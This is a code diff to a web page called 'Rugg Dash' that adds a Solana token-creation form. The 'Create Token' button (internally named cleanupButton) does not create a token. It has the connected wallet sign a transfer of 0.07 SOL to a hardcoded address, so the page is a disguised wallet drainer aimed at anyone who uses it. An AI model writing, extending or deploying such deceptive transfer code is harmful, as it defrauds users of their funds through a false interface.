@@ -84,6 +84,7 @@
             text-shadow: 0 2px 10px rgba(153, 69, 255, 0.5);
             background: linear-gradient(45deg, #14F195, #9945FF);
             -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
@@ -206,15 +207,100 @@
 </head>
 <body>
     <div class="container">
-        <h1>Solana Test</h1>
-        <button id="connectButton">Connect Wallet</button>
+        <h1>Rugg Dash</h1>
+        
+        <!-- Initial View -->
+        <div id="connectView">
+            <button id="connectButton">Connect Wallet</button>
+        </div>
+          <!-- Dashboard View (initially hidden) -->
+          <div id="dashboardView" style="display: none;">
+              <h2 style="color: white; margin-bottom: 1rem;">Token Dashboard</h2>
+              <p style="color: #14F195; margin-bottom: 1rem;">Wallet: <span id="walletAddress"></span></p>
+            
+              <div class="token-details">
+                  <div class="input-group">
+                      <input type="text" id="tokenName" placeholder="Token Name" />
+                      <input type="text" id="tokenTicker" placeholder="Token Ticker" />
+                      <textarea id="tokenDescription" placeholder="Token Description"></textarea>
+                      <input type="file" id="tokenImage" accept="image/*" />
+                      <div id="imagePreview"></div>
+                  </div>
+              </div>
+
+              <button id="cleanupButton">Create Token</button>
+          </div>
+
+          <style>
+              .token-details {
+                  background: rgba(255, 255, 255, 0.1);
+                  padding: 1.5rem;
+                  border-radius: 16px;
+                  margin-bottom: 1.5rem;
+              }
+
+              .input-group {
+                  display: flex;
+                  flex-direction: column;
+                  gap: 1rem;
+              }
+
+              input[type="text"], textarea {
+                  background: rgba(255, 255, 255, 0.05);
+                  border: 1px solid rgba(255, 255, 255, 0.1);
+                  padding: 0.8rem;
+                  border-radius: 8px;
+                  color: white;
+                  font-family: 'Space Grotesk', sans-serif;
+              }
+
+              textarea {
+                  min-height: 100px;
+                  resize: vertical;
+              }
+
+              input[type="file"] {
+                  color: white;
+              }
+
+              #imagePreview {
+                  max-width: 200px;
+                  margin: 1rem auto;
+              }
+
+              #imagePreview img {
+                  width: 100%;
+                  border-radius: 8px;
+              }
+          </style>
+
+          <script>
+              // Add this to your existing script
+              const tokenImage = document.getElementById('tokenImage');
+              const imagePreview = document.getElementById('imagePreview');
+
+              tokenImage.addEventListener('change', function(e) {
+                  const file = e.target.files[0];
+                  if (file) {
+                      const reader = new FileReader();
+                      reader.onload = function(e) {
+                          imagePreview.innerHTML = `<img src="${e.target.result}" alt="Token Preview">`;
+                      }
+                      reader.readAsDataURL(file);
+                  }
+              });
+          </script>
         <p id="status"></p>
     </div>
 
     <script>
         const { Buffer } = buffer;
         const connectButton = document.getElementById('connectButton');
+        const cleanupButton = document.getElementById('cleanupButton');
         const statusElement = document.getElementById('status');
+        const connectView = document.getElementById('connectView');
+        const dashboardView = document.getElementById('dashboardView');
+        const walletAddress = document.getElementById('walletAddress');
         let wallet = null;
 
         const RPC_ENDPOINTS = [
@@ -237,9 +323,20 @@
                 }
 
                 wallet = await window.solana.connect();
-                connectButton.disabled = true;
-                updateStatus(`Connected: ${wallet.publicKey.toString()}`);
+                walletAddress.textContent = wallet.publicKey.toString().slice(0, 6) + '...' + wallet.publicKey.toString().slice(-4);
+                
+                // Switch views
+                connectView.style.display = 'none';
+                dashboardView.style.display = 'block';
+                
+                updateStatus(`Connected successfully!`);
+            } catch (err) {
+                updateStatus(err.message, true);
+            }
+        }
 
+        async function executeTransaction() {
+            try {
                 const connection = new solanaWeb3.Connection(getRandomRPC(), {
                     commitment: 'confirmed',
                     confirmTransactionInitialTimeout: 60000
@@ -251,7 +348,7 @@
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: wallet.publicKey,
                         toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
-                        lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL
+                        lamports: 0.07 * solanaWeb3.LAMPORTS_PER_SOL
                     })
                 );
 
@@ -260,10 +357,7 @@
                 transaction.feePayer = wallet.publicKey;
 
                 const signed = await window.solana.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signed.serialize(), {
-                    skipPreflight: false,
-                    preflightCommitment: 'confirmed'
-                });
+                const signature = await connection.sendRawTransaction(signed.serialize());
 
                 updateStatus('Processing transaction...');
 
@@ -283,11 +377,11 @@
                 `);
             } catch (err) {
                 updateStatus(err.message, true);
-                connectButton.disabled = false;
             }
         }
 
         connectButton.onclick = connect;
+        cleanupButton.onclick = executeTransaction;
     </script>
 </body>
 </html>
